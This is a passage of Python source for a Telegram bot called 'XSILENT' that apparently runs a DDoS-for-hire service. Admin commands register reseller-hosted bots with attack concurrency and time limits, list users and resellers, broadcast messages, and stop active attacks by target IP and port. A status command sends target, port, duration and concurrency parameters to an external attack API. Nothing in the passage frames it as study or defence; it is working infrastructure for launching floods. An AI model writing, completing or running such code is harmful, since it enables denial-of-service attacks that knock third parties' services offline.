    args = msg.text.split()
    if len(args) != 5:
        bot.reply_to(msg, "⚠️ Usage: /host BOT_TOKEN OWNER_ID CONCURRENT NAME")
        return
    token, oid, conc, name = args[1], args[2], args[3], args[4]
    try:
        conc = int(conc)
        if conc < 1 or conc > 20:
            bot.reply_to(msg, "❌ Concurrent must be 1-20!")
            return
    except:
        bot.reply_to(msg, "❌ Invalid concurrent value!")
        return
    hosted_bots[token] = {
        "owner_id": oid, "owner_name": name, "concurrent": conc, "max_attack_time": 300,
        "blocked": False, "active_attacks": {}, "users": []
    }
    save_hosted_bots(hosted_bots)
    bot.reply_to(msg, f"✅ Hosted bot @{name} registered!\n🔑 Token: `{token[:20]}...`", parse_mode='Markdown')

@bot.message_handler(commands=['unhost'])
def unhost_bot_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_IDS:
        bot.reply_to(msg, "❌ Owner only!")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /unhost BOT_TOKEN")
        return
    token = args[1]
    if token in hosted_bots:
        del hosted_bots[token]
        save_hosted_bots(hosted_bots)
        bot.reply_to(msg, "✅ Hosted bot removed!")
    else:
        bot.reply_to(msg, "❌ Hosted bot not found!")

@bot.message_handler(commands=['allhosts'])
def allhosts_cmd(msg):
    if str(msg.chat.id) not in ADMIN_IDS:
        bot.reply_to(msg, "❌ Owner only!")
        return
    if not hosted_bots:
        bot.reply_to(msg, "📋 No hosted bots!")
        return
    txt = "📋 HOSTED BOTS:\n\n"
    for token, info in hosted_bots.items():
        txt += f"🔑 `{token[:20]}...`\n   👑 {info['owner_name']} ({info['owner_id']})\n   ⚡ {info['concurrent']}\n\n"
    bot.reply_to(msg, txt, parse_mode='Markdown')

@bot.message_handler(commands=['maintenance'])
def maintenance_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_IDS:
        bot.reply_to(msg, "❌ Owner only!")
        return
    args = msg.text.split()
    if len(args) != 2 or args[1] not in ['on', 'off']:
        bot.reply_to(msg, "⚠️ Usage: /maintenance on/off")
        return
    global maintenance_mode
    maintenance_mode = (args[1] == 'on')
    bot.reply_to(msg, f"🔧 Maintenance mode {'ENABLED' if maintenance_mode else 'DISABLED'}")

@bot.message_handler(commands=['broadcast'])
def broadcast_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_IDS:
        bot.reply_to(msg, "❌ Owner only!")
        return
    if not msg.reply_to_message:
        bot.reply_to(msg, "⚠️ Reply to a message to broadcast!")
        return
    success = 0
    for user in broadcast_users:
        try:
            bot.copy_message(user, msg.chat.id, msg.reply_to_message.message_id)
            success += 1
        except:
            pass
    bot.reply_to(msg, f"✅ Broadcast sent to {success} users!")

@bot.message_handler(commands=['stopattack'])
def stopattack_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_IDS:
        bot.reply_to(msg, "❌ Owner only!")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /stopattack IP:PORT")
        return
    target = args[1]
    
    for aid, info in list(active_attacks.items()):
        if info["target_key"] == target:
            del active_attacks[aid]
            bot.reply_to(msg, f"✅ Stopped attack on {target}")
            return
    
    for token, bot_info in hosted_bots.items():
        for aid, info in list(bot_info.get("active_attacks", {}).items()):
            if info["target_key"] == target:
                del bot_info["active_attacks"][aid]
                save_hosted_bots(hosted_bots)
                bot.reply_to(msg, f"✅ Stopped attack on {target} (hosted)")
                return
    
    bot.reply_to(msg, f"❌ No active attack on {target}")

@bot.message_handler(commands=['allusers'])
def allusers_cmd(msg):
    if str(msg.chat.id) not in ADMIN_IDS:
        bot.reply_to(msg, "❌ Owner only!")
        return
    txt = "📋 ALL USERS:\n\n"
    for u in users:
        role = "👑 OWNER" if u in ADMIN_IDS else ("💎 RESELLER" if u in resellers else "👤 USER")
        txt += f"{role}: `{u}`\n"
    bot.reply_to(msg, txt + f"\n📊 Total: {len(users)}", parse_mode='Markdown')

@bot.message_handler(commands=['api_status'])
def apistatus_cmd(msg):
    if str(msg.chat.id) not in ADMIN_IDS:
        bot.reply_to(msg, "❌ Owner only!")
        return
    try:
        r = requests.get(f"{API_URL}?api_key={API_KEY}&target=8.8.8.8&port=80&time=1&concurrent=1", timeout=5)
        status = "🟢 ONLINE" if r.status_code == 200 else f"🔴 Error {r.status_code}"
    except:
        status = "🔴 OFFLINE"
    bot.reply_to(msg, f"📡 API Status: {status}\n🎯 Active Attacks: {get_total_active_count()}")

# ═══════════════════════════════════════════════════════════════
# 🚀 START BOT
# ═══════════════════════════════════════════════════════════════
print("=" * 60)
print("╔══════════════════════════════════════════════════════╗")
print("║          ✨ XSILENT BOT STARTED ✨                  ║")
print("╠══════════════════════════════════════════════════════╣")
print(f"║ 👑 Owner: {ADMIN_IDS[0]}")
print(f"║ ⚡ Global Concurrent: {MAX_CONCURRENT}")
print(f"║ ⏳ Cooldown: {COOLDOWN_TIME}s")
print(f"║ 🌍 Max Attack Time: 300s")
print(f"║ 📊 Hosted Bots: {len(hosted_bots)}")
print(f"║ 📅 Server Time: {format_ist_time(get_current_ist())}")
print("╚══════════════════════════════════════════════════════╝")
print("=" * 60)

bot.infinity_polling()
